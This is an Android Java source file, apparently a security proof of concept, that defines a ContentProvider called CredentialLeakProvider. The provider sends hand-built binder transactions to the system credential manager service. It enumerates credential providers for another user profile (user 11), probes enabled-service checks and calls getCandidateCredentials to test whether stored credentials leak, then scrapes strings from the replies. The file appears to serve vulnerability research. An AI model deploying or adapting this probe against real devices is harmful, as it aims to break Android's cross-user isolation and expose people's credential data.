package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CredentialLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("credential");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.credentials.ICredentialManager";

        // TX=10: getCredentialProviderServices(int userId, int providerFilter)
        testGetProviders(binder, desc, cursor, 0, "u0");
        testGetProviders(binder, desc, cursor, 11, "u11_private");

        // TX=11: getCredentialProviderServicesForTesting(int providerFilter)
        testGetProvidersForTesting(binder, desc, cursor);

        // TX=12: isServiceEnabled()
        testIsServiceEnabled(binder, desc, cursor);

        // TX=9: isEnabledCredentialProviderService(ComponentName, String callerPackage)
        testIsEnabledProvider(binder, desc, cursor);

        // TX=4: getCandidateCredentials - could expose stored credentials!
        testGetCandidateCredentials(binder, desc, cursor);

        return cursor;
    }

    private void testGetProviders(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(userId); // userId
            data.writeInt(0); // providerFilter (0 = all?)
            binder.transact(10, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getProviders_" + tag, "SUCCESS avail=" + avail});

                // Parse the response - it's a List<CredentialProviderInfo>
                int listSize = reply.readInt();
                cursor.addRow(new Object[]{"providers_count_" + tag, String.valueOf(listSize)});

                for (int i = 0; i < Math.min(listSize, 10); i++) {
                    try {
                        // CredentialProviderInfo is parceled with ServiceInfo inside
                        // Read non-null marker
                        int nonNull = reply.readInt();
                        if (nonNull == 0) continue;

                        // ServiceInfo starts with packageName & serviceName
                        // Format: int serviceInfoSize, then ServiceInfo parcel data
                        // Actually CredentialProviderInfo parceling is custom
                        // Let's just read strings we can find
                        int startPos = reply.dataPosition();
                        int chunkSize = Math.min(reply.dataAvail(), 500);
                        byte[] chunk = new byte[chunkSize];
                        reply.readByteArray(chunk);

                        // Extract ASCII strings
                        StringBuilder strings = new StringBuilder();
                        StringBuilder current = new StringBuilder();
                        for (byte b : chunk) {
                            if (b >= 32 && b < 127) {
                                current.append((char)b);
                            } else {
                                if (current.length() >= 4) {
                                    strings.append(current.toString()).append("|");
                                }
                                current = new StringBuilder();
                            }
                        }
                        if (current.length() >= 4) strings.append(current.toString());

                        String result = strings.toString();
                        if (result.length() > 200) result = result.substring(0, 200);
                        cursor.addRow(new Object[]{"provider_" + tag + "_" + i, result});

                        // Reset position for next item
                        reply.setDataPosition(startPos + chunkSize);
                    } catch (Exception e) {
                        cursor.addRow(new Object[]{"provider_" + tag + "_" + i, "parseErr:" + e.getMessage()});
                        break;
                    }
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getProviders_" + tag, "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getProviders_" + tag, "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGetProvidersForTesting(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // providerFilter
            binder.transact(11, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getProvidersForTesting", "SUCCESS avail=" + avail});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getProvidersForTesting", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getProvidersForTesting", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testIsServiceEnabled(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(12, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"isServiceEnabled", "enabled=" + enabled});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"isServiceEnabled", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"isServiceEnabled", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testIsEnabledProvider(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // isEnabledCredentialProviderService(ComponentName, String callerPackage)
            data.writeInt(1); // non-null ComponentName
            data.writeString("com.google.android.gms");
            data.writeString(".auth.api.credentials.credman.service.GoogleIdService");
            data.writeString(getContext().getPackageName()); // callerPackage
            binder.transact(9, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"isEnabledGoogleId", "enabled=" + enabled});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"isEnabledGoogleId", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"isEnabledGoogleId", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGetCandidateCredentials(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // getCandidateCredentials(GetCredentialRequest, IGetCandidateCredentialsCallback, String callerPkg)
            // Try with minimal params
            data.writeInt(1); // non-null GetCredentialRequest
            // GetCredentialRequest has: List<CredentialOption> credentialOptions, Bundle data, String origin
            data.writeInt(0); // empty list
            data.writeInt(-1); // null Bundle
            data.writeString(null); // origin
            data.writeStrongBinder(new android.os.Binder()); // callback
            data.writeString(getContext().getPackageName()); // callerPkg
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"getCandidateCredentials", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getCandidateCredentials", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getCandidateCredentials", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
